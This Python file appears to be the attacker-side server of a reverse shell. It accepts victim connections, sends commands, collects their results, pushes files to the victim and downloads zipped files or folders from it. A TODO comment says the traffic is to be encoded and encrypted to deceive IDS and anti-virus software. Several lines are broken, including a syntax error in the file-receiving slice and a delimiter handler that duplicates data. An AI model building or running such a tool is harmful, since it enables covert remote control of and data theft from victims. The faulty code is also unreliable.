import socket

CHUCK_SIZE = 4 * 1024

DELIMETER = "<END_OF_RESULTS>"


class ServerConnection:
    def __init__(self):
        # Create TCP Socket for Server
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def createConnection(self, ip="", port=9001):
        self.server_ip = ip
        self.server_port = port
        self.address = (self.server_ip, self.server_port)
        self.sock.bind(self.address)

    def listen(self, backlog = 5):
        self.sock.listen(backlog)

    def acceptConnection(self):
        self.client_conn, self.client_address = self.sock.accept()
        print("[+] Connection established with " + self.client_address[0] + " on port " + str(self.client_address[1]))
        return (self.client_conn, self.client_address)

    def sendData(self, user_input):
        user_input_bytes = user_input.encode("utf-8")
        self.client_conn.send(user_input_bytes)
    
    def receiveData(self):
        received_data_bytes = self.client_conn.recv(CHUCK_SIZE)
        self.data = received_data_bytes.decode("utf-8")
        return self.data

    def receiveCommandResult(self):
        print("[+] Getting Command Results")
        result = b''
        while True:
            chunk =self.client_conn.recv(CHUCK_SIZE)

            if chunk.endswith(DELIMETER.encode()):
                chunk += chunk[:-len(DELIMETER)]
                result += chunk
                break
            
            result += chunk


        return result.decode()

    def sendFile(self, filename):
        # Todo: encode and encrypt to deceive IDS and anti-virus software
        print("[+] Sending file")
        with open(filename, "rb") as file:
            chunk = file.read(CHUCK_SIZE)
            while len(chunk) > 0:
                self.client_conn.send(chunk)
                chunk = file.read(CHUCK_SIZE)

            self.client_conn.send(DELIMETER.encode())

    def receiveZipped(self, zippedFile):
        print("[+] Receiving zipped file/folder")
        full_file = b''
        while True:
            chunk = self.client_conn.recv(CHUCK_SIZE)
            if chunk.endswith(DELIMETER.decode()):
                chunk = chunk[:-;len(DELIMETER)]
                full_file += chunk
                break

            full_file += chunk
        
        with open(zippedFile, "wb") as file:
            file.write(full_file)
            print("[+] File/Folder downloaded successfully")

    def changeDirectory(self):
        print("[+] Changing directory")
        pwd = self.receiveData()
        while True:
            print(f'{pwd} >> ', end=" ")
            user_command = input("")
            self.sendData(user_command)
            if user_command == "stop":
                break
            pwd = self.receiveData()